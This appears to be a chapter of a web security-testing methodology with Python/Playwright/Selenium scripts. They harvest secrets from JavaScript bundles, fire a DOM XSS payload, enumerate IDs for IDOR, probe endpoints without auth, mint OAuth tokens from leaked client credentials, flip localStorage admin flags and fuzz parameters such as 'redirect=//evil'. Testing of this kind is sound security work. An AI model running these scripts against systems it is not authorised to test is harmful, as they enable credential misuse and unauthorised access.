# 04 — Dynamic Analysis

## Goal
Confirm static findings with real browser execution. Write small, targeted Python/Selenium/Chromium scripts that prove or disprove findings — eliminating false positives before reporting.

---

## Setup Options: Playwright (preferred) + Selenium (fallback)

```bash
# --- PLAYWRIGHT (preferred for modern SPAs — handles React/Next.js better than Selenium) ---
pip install playwright --break-system-packages
playwright install chromium  # downloads Chromium automatically
python3 -c "from playwright.sync_api import sync_playwright; print('[+] Playwright ready')"

# --- SELENIUM (fallback) ---
pip install selenium webdriver-manager requests --break-system-packages
apt-get install -y chromium-browser chromium-driver 2>/dev/null || \
  apt-get install -y chromium 2>/dev/null || true
python3 -c "from selenium import webdriver; print('[+] Selenium ready')"
```

---

## Playwright Base Template (preferred for 2025+ targets)

```python
# scripts/playwright_base.py
from playwright.sync_api import sync_playwright
import json, time

def get_browser(proxy=None, headless=True):
    """Returns a configured Playwright browser context."""
    pw = sync_playwright().start()
    browser = pw.chromium.launch(
        headless=headless,
        args=["--disable-web-security", "--ignore-certificate-errors"]
    )
    ctx_opts = {
        "viewport": {"width": 1920, "height": 1080},
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "ignore_https_errors": True,
    }
    if proxy:
        ctx_opts["proxy"] = {"server": proxy}
    ctx = browser.new_context(**ctx_opts)
    return pw, browser, ctx

def capture_all_js_requests(ctx, url, wait_ms=3000):
    """Load URL, capture every JS file URL loaded, and their full response bodies."""
    js_requests = []

    def on_response(resp):
        if '.js' in resp.url and resp.status == 200:
            try:
                body = resp.body()
                js_requests.append({"url": resp.url, "body": body.decode('utf-8', errors='replace')})
            except Exception:
                pass

    page = ctx.new_page()
    page.on("response", on_response)
    page.goto(url, wait_until="networkidle", timeout=30000)
    page.wait_for_timeout(wait_ms)
    return page, js_requests
```

---

## Playwright Script: Full JS Harvest + Secret Confirmation

```python
# scripts/playwright_js_harvest.py
"""
Usage: python playwright_js_harvest.py https://target.com
Loads the app, captures ALL JS (including lazy chunks), and extracts secrets.
"""
import sys, re, json
from playwright_base import get_browser, capture_all_js_requests

PATTERNS = {
    "OpenAI":    r'sk-[A-Za-z0-9]{48}|sk-proj-[A-Za-z0-9_\-]{48,}',
    "Anthropic": r'sk-ant-[A-Za-z0-9\-_]{90,}',
    "AWS":       r'AKIA[0-9A-Z]{16}',
    "JWT":       r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
    "Bearer":    r'(?i)bearer\s+[A-Za-z0-9\-._~+/]{40,}',
}

url = sys.argv[1]
pw, browser, ctx = get_browser(headless=True)

try:
    page, js_requests = capture_all_js_requests(ctx, url)

    # Navigate ALL SPA routes to trigger lazy chunk loading
    routes = page.evaluate("""() => {
        // React Router
        if (window.__reactRouterVersion) {
            return Object.keys(window.__reactRouterRoutes || {});
        }
        // Collect href from all <a> tags
        return [...document.querySelectorAll('a[href]')]
            .map(a => a.getAttribute('href'))
            .filter(h => h && h.startsWith('/'));
    }""")

    for route in (routes or [])[:10]:
        try:
            page.goto(url.rstrip('/') + route, wait_until="domcontentloaded", timeout=10000)
            page.wait_for_timeout(1000)
        except Exception:
            pass

    print(f"[+] Captured {len(js_requests)} JS files")
    findings = []
    for req in js_requests:
        for pname, pat in PATTERNS.items():
            matches = re.findall(pat, req['body'])
            for m in matches:
                findings.append({"type": pname, "match": m[:100], "url": req['url']})
                print(f"[{pname}] {m[:80]} (from {req['url'][:60]})")

    # Also capture __NEXT_DATA__ and similar SSR state
    ssr = page.evaluate("""() => ({
        __NEXT_DATA__: window.__NEXT_DATA__ || null,
        __NUXT__: window.__NUXT__ || null,
        __remixContext: window.__remixContext || null,
    })""")
    for k, v in ssr.items():
        if v:
            print(f"[SSR-STATE] {k} found — check for tokens/PII")
            with open(f"ssr_{k}.json", "w") as f:
                json.dump(v, f, indent=2)

    with open("playwright_findings.json", "w") as f:
        json.dump(findings, f, indent=2)
    print(f"[DONE] {len(findings)} secrets found, saved to playwright_findings.json")

finally:
    browser.close()
    pw.stop()
```

---

## Playwright Script: WebSocket Interception

```python
# scripts/playwright_websocket.py
"""Test WebSocket endpoints for missing auth, unvalidated origin, and message injection."""
import sys, json
from playwright.sync_api import sync_playwright

url = sys.argv[1]  # e.g. https://target.com

pw = sync_playwright().start()
browser = pw.chromium.launch(headless=True)
ctx = browser.new_context(ignore_https_errors=True)
page = ctx.new_page()

ws_events = []

# Hook WebSocket constructor before page loads
page.add_init_script("""
window.__ws_log = [];
const OrigWS = window.WebSocket;
window.WebSocket = function(url, protocols) {
    const ws = protocols ? new OrigWS(url, protocols) : new OrigWS(url);
    window.__ws_log.push({type: 'connect', url: url, time: Date.now()});
    ws.addEventListener('message', e => {
        window.__ws_log.push({type: 'message', url: url, data: typeof e.data === 'string' ? e.data.slice(0,500) : '[binary]'});
    });
    ws.addEventListener('error', e => {
        window.__ws_log.push({type: 'error', url: url});
    });
    return ws;
};
""")

page.goto(url, wait_until="networkidle", timeout=30000)
page.wait_for_timeout(5000)

ws_log = page.evaluate("window.__ws_log")
print(f"[WebSocket] {len(ws_log)} events captured")
for ev in ws_log:
    print(f"  [{ev['type']}] {ev.get('url','')} — {str(ev.get('data',''))[:100]}")

browser.close()
pw.stop()
```

---

## Base Chromium Driver Template

```python
# scripts/driver_base.py
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time, json

def get_driver(proxy=None, headless=True):
    opts = Options()
    if headless:
        opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--window-size=1920,1080")
    opts.add_argument("--disable-web-security")  # for CORS testing
    opts.add_argument("--ignore-certificate-errors")
    # Enable CDP for network monitoring
    opts.set_capability("goog:loggingPrefs", {"performance": "ALL", "browser": "ALL"})
    if proxy:
        opts.add_argument(f"--proxy-server={proxy}")
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
    except Exception:
        # Fallback: use system chromium
        opts.binary_location = "/usr/bin/chromium-browser"
        service = Service("/usr/bin/chromedriver")
        driver = webdriver.Chrome(service=service, options=opts)
    return driver
```

---

## Script 1: Token/Secret Leak Validator

Confirms that a discovered token/key is actually present and valid in runtime.

```python
# scripts/validate_token_leak.py
"""
Usage: python validate_token_leak.py <url> <token_pattern>
Loads the page, intercepts network requests, checks for leaked tokens.
"""
import sys, re, json, time
from driver_base import get_driver

url = sys.argv[1]
pattern = sys.argv[2] if len(sys.argv) > 2 else r'AKIA[0-9A-Z]{16}'

driver = get_driver()
findings = []

try:
    print(f"[*] Loading: {url}")
    driver.get(url)
    time.sleep(3)

    # Check all loaded JS sources
    logs = driver.get_log("performance")
    for log in logs:
        msg = json.loads(log["message"])["message"]
        if msg.get("method") == "Network.responseReceived":
            resp_url = msg["params"]["response"]["url"]
            if ".js" in resp_url:
                try:
                    body = driver.execute_cdp_cmd("Network.getResponseBody",
                        {"requestId": msg["params"]["requestId"]})
                    content = body.get("body", "")
                    matches = re.findall(pattern, content)
                    if matches:
                        findings.append({"url": resp_url, "matches": matches})
                        print(f"[CONFIRMED] {resp_url}")
                        for m in matches:
                            print(f"  Token: {m}")
                except Exception:
                    pass

    # Also check page source
    src = driver.page_source
    matches = re.findall(pattern, src)
    if matches:
        findings.append({"source": "page_html", "matches": matches})
        print(f"[CONFIRMED IN PAGE] {matches}")

finally:
    driver.quit()

if findings:
    print(f"\n[RESULT] CONFIRMED — {len(findings)} source(s) contain the pattern")
    print(json.dumps(findings, indent=2))
else:
    print("\n[RESULT] NOT CONFIRMED — pattern not found at runtime (possible false positive)")
```

---

## Script 2: DOM XSS Sink Tester

```python
# scripts/test_dom_xss.py
"""
Usage: python test_dom_xss.py <url> <param_name>
Injects XSS probes into URL params/hash/path and monitors for sink execution.
"""
import sys, time, json
from driver_base import get_driver

base_url = sys.argv[1]
param = sys.argv[2] if len(sys.argv) > 2 else "q"

PROBES = [
    ("hash_probe",    f"{base_url}#{param}=JSRA_PROBE_{{i}}"),
    ("query_probe",   f"{base_url}?{param}=JSRA_PROBE_{{i}}"),
    ("path_probe",    f"{base_url}/JSRA_PROBE_{{i}}"),
]

XSS_PAYLOAD = "<img src=x onerror=window.__JSRA_XSS=1>"
driver = get_driver()

try:
    for name, tmpl in PROBES:
        # First: check if probe reflects into DOM
        probe_url = tmpl.format(i="TEST123")
        driver.get(probe_url)
        time.sleep(1.5)
        if "TEST123" in driver.page_source:
            print(f"[REFLECT] {name} — probe reflects in DOM!")

            # Second: inject actual XSS payload
            xss_url = tmpl.format(i=XSS_PAYLOAD)
            driver.get(xss_url)
            time.sleep(2)
            result = driver.execute_script("return window.__JSRA_XSS")
            if result == 1:
                print(f"[DOM XSS CONFIRMED] {name} — payload executed!")
                print(f"  PoC URL: {xss_url}")
            else:
                print(f"[PARTIAL] {name} — reflects but payload didn't execute (check sink context)")
        else:
            print(f"[-] {name} — no reflection")
finally:
    driver.quit()
```

---

## Script 3: IDOR / BAC Endpoint Tester

```python
# scripts/test_idor.py
"""
Usage: python test_idor.py <endpoint_template> <id_list> <auth_token>
Tests endpoints with different IDs and compares response sizes/status.
Example: python test_idor.py "https://api.target.com/user/{id}/profile" ids.txt "Bearer eyJ..."
"""
import sys, requests, json

template = sys.argv[1]  # e.g. https://api.target.com/user/{id}/data
id_file  = sys.argv[2]  # file with IDs to test
token    = sys.argv[3] if len(sys.argv) > 3 else ""

headers = {"Authorization": token} if token else {}
headers["User-Agent"] = "Mozilla/5.0"

findings = []
with open(id_file) as f:
    ids = [l.strip() for l in f if l.strip()]

baseline_id = ids[0]
baseline_url = template.replace("{id}", baseline_id)
baseline_resp = requests.get(baseline_url, headers=headers, timeout=10)
baseline_size = len(baseline_resp.text)
print(f"[BASELINE] id={baseline_id} status={baseline_resp.status_code} size={baseline_size}")

for test_id in ids[1:]:
    url = template.replace("{id}", test_id)
    try:
        r = requests.get(url, headers=headers, timeout=10)
        size_diff = abs(len(r.text) - baseline_size)
        if r.status_code == 200 and size_diff > 50:
            findings.append({"id": test_id, "url": url, "status": r.status_code, "size": len(r.text)})
            print(f"[POTENTIAL IDOR] id={test_id} status={r.status_code} size={len(r.text)}")
        else:
            print(f"[-] id={test_id} status={r.status_code} size={len(r.text)}")
    except Exception as e:
        print(f"[ERR] id={test_id}: {e}")

if findings:
    print(f"\n[RESULT] {len(findings)} potential IDOR(s) found")
    with open("idor_findings.json", "w") as f:
        json.dump(findings, f, indent=2)
```

---

## Script 4: Endpoint Availability + Auth Check

```python
# scripts/probe_endpoints.py
"""
Usage: python probe_endpoints.py endpoints.txt [auth_token]
Probes each endpoint: checks status with/without auth, detects misconfigs.
"""
import sys, requests, json, concurrent.futures

ep_file = sys.argv[1]
token   = sys.argv[2] if len(sys.argv) > 2 else None

with open(ep_file) as f:
    endpoints = [l.strip() for l in f if l.strip() and l.startswith("http")]

AUTH_HDR = {"Authorization": f"Bearer {token}"} if token else {}
NO_AUTH  = {}

findings = []

def probe(url):
    results = {}
    for label, headers in [("no_auth", NO_AUTH), ("with_auth", AUTH_HDR)]:
        try:
            r = requests.get(url, headers={**headers, "User-Agent": "Mozilla/5.0"}, timeout=8, allow_redirects=False)
            results[label] = {"status": r.status_code, "size": len(r.text), "ct": r.headers.get("Content-Type","")}
        except Exception as e:
            results[label] = {"error": str(e)}

    # Flag interesting cases
    na = results.get("no_auth", {})
    wa = results.get("with_auth", {})
    interesting = False
    reason = []

    if na.get("status") == 200:
        reason.append("accessible without auth")
        interesting = True
    if na.get("status") == 200 and wa.get("status") == 200 and na.get("size") == wa.get("size"):
        reason.append("same response with/without auth (BAC?)")
        interesting = True
    if na.get("status") in [500, 503]:
        reason.append("server error without auth — may expose info")
        interesting = True

    return {"url": url, "results": results, "interesting": interesting, "reason": reason}

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    futures = {ex.submit(probe, url): url for url in endpoints}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result["interesting"]:
            print(f"[FLAG] {result['url']}")
            for r in result["reason"]:
                print(f"  -> {r}")
            findings.append(result)
        else:
            print(f"[-] {result['url']} no_auth={result['results'].get('no_auth',{}).get('status','?')}")

with open("endpoint_probe_results.json", "w") as f:
    json.dump(findings, f, indent=2)
print(f"\n[DONE] {len(findings)} interesting endpoint(s) flagged")
```

---

## Script 5: postMessage Origin Check

```python
# scripts/test_postmessage.py
"""
Injects a rogue postMessage from a different origin to detect missing origin checks.
"""
import sys, time
from driver_base import get_driver

target_url = sys.argv[1]
driver = get_driver(headless=False)  # visible for inspection

try:
    driver.get(target_url)
    time.sleep(2)

    # Inject postMessage from 'null' origin via data: URI trick
    probe_payload = "JSRA_PM_PROBE"
    driver.execute_script(f"""
        window.__jsra_pm_triggered = false;
        var origHandler = window.addEventListener;
        window.addEventListener('message', function(e) {{
            if (JSON.stringify(e.data).includes('JSRA_PM_PROBE')) {{
                window.__jsra_pm_triggered = true;
                window.__jsra_pm_origin = e.origin;
            }}
        }});
        window.postMessage('{probe_payload}', '*');
    """)
    time.sleep(1)

    triggered = driver.execute_script("return window.__jsra_pm_triggered")
    origin = driver.execute_script("return window.__jsra_pm_origin")

    if triggered:
        print(f"[postMessage] Handler TRIGGERED from origin: {origin}")
        if origin in ["null", "http://localhost", "*"]:
            print("[VULN] postMessage handler accepts messages from any/null origin!")
    else:
        print("[postMessage] Handler not triggered or not present")
finally:
    driver.quit()
```

---

## Advanced Dynamic Confirmation (v2 — creative additions)

### Script 6: OAuth client-credential token mint (confirm leaked client_id/secret)

```python
# scripts/mint_oauth_token.py — proves a leaked OAuth client cred is LIVE, not theoretical
import sys, requests, base64
token_url = sys.argv[1]                     # https://apigw.target.com/oauth/token
cid, secret = sys.argv[2], sys.argv[3]
blob = base64.b64encode(f"{cid}:{secret}".encode()).decode()
r = requests.post(token_url,
    headers={"Authorization": f"Basic {blob}",
             "Content-Type": "application/x-www-form-urlencoded"},
    data={"grant_type": "client_credentials"}, timeout=10)
print(r.status_code, r.text[:400])
if r.status_code == 200 and "access_token" in r.text:
    print("[CONFIRMED] minted a real token — the secret can't be rotated without")
    print("            breaking prod → High/Critical. Now probe the gateway with this token.")
```

### Script 7: hidden-route + feature-flag flip (client-side gate bypass)

```python
# scripts/flip_flag_visit_route.py — force a client-side gate, visit a guarded route, check API
import sys, time
from driver_base import get_driver
url, route = sys.argv[1], sys.argv[2]       # base URL, '/admin'
driver = get_driver()
driver.get(url); time.sleep(2)
driver.execute_script("""
  try { localStorage.setItem('isAdmin','true'); } catch(e){}
  try { localStorage.setItem('feature_admin','true'); } catch(e){}
  try { localStorage.setItem('role','admin'); } catch(e){}
""")
driver.get(url.rstrip('/') + route); time.sleep(3)
print("[URL]", driver.current_url)
print("[BODY sample]", driver.page_source[:600])
# If the guarded view RENDERS and its XHRs return 200 with real data,
# the server never re-checked authz → BAC. Capture the XHRs as the PoC.
```

### Script 8: fuzz params discovered IN the JS

```bash
# Harvest variable/param names from the bundle, then fuzz the endpoints they belong to.
grep -oiE '["'\''](debug|admin|test|internal|role|impersonate|redirect|callback|next|url|preview|draft)["'\'']' beautified/*.js | sort -u > js_param_names.txt
x8    -u "https://$HOST/api/resource" -w js_param_names.txt -X GET POST
arjun -u "https://$HOST/api/resource" -w js_param_names.txt -m GET,POST
# Always also try by hand: debug=true  admin=1  test=1  callback=x  redirect=//evil  internal=1
```
